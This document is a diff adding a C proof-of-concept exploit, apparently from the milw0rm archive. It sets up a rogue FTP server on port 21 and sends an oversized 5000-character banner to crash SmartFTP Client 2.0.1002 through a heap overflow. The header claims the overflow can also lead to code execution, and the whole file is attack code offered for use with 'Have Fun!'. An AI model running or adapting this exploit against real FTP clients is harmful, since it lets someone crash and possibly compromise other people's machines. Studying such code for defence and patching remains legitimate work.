@@ -1,0 +1,67 @@
+/***************************************************************************
+*              SmartFTP Client v 2.0.1002 Heap Overflow DoS                *
+*                                                                          *
+*                                                                          *
+* There is remote heap overflow in SmartFTP. When the app receives a long  *
+* banner (5000 char) the heap is smashed, leading to DoS and to code       *
+* execution.                                                               *
+*                                                                          *
+* There are also two buffer overflow in the fields Address and Login.      *
+* I've reported this to Secunia but it seems they didn't think it was dan- *
+* gerous cause they didn't publish anything about. However a simple drag'n *
+* drop could compromise your system...                                     *
+*                                                                          *
+* Have Fun!                                                                *
+*                                                                          *
+* Coded by Marsu <Marsupilamipowa@hotmail.fr>                              *
+***************************************************************************/
+
+
+
+#include "winsock2.h"
+#include "stdio.h"
+#include "stdlib.h"
+#pragma comment(lib, "ws2_32.lib")
+
+int main(int argc, char* argv[])
+{
+
+	char evilbuff[5000];
+	sockaddr_in sin;
+	int server,client;
+	WSADATA wsaData;
+	WSAStartup(MAKEWORD(1,1), &wsaData);
+
+	server = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
+	sin.sin_family = PF_INET;
+	sin.sin_addr.s_addr = htonl(INADDR_ANY);
+	sin.sin_port = htons( 21 );
+	bind(server,(SOCKADDR*)&sin,sizeof(sin));
+	printf("[*] Listening on port 21...\n");
+	listen(server,5);
+	printf("[*] Waiting for client ...\n");
+	client=accept(server,NULL,NULL);
+	printf("[+] Client connected\n");
+
+	memset(evilbuff,'A',5000);
+	memcpy(evilbuff,"220 ",4);
+	memcpy(evilbuff+4997,"\r\n\0",3);
+
+	if (send(client,evilbuff,strlen(evilbuff),0)==-1)
+	{
+		printf("[-] Error in send!\n");
+		exit(-1);
+	}
+	printf("[+] Data sent\n");
+
+	Sleep(1500);
+
+	if (send(client,"boom?",5,0)==-1)
+	    printf("[+] Crashed? Crashed!\n");
+	else
+		printf("[-] Exploit failed!\n");
+
+	return 0;
+}
+
+// milw0rm.com [2007-02-06]
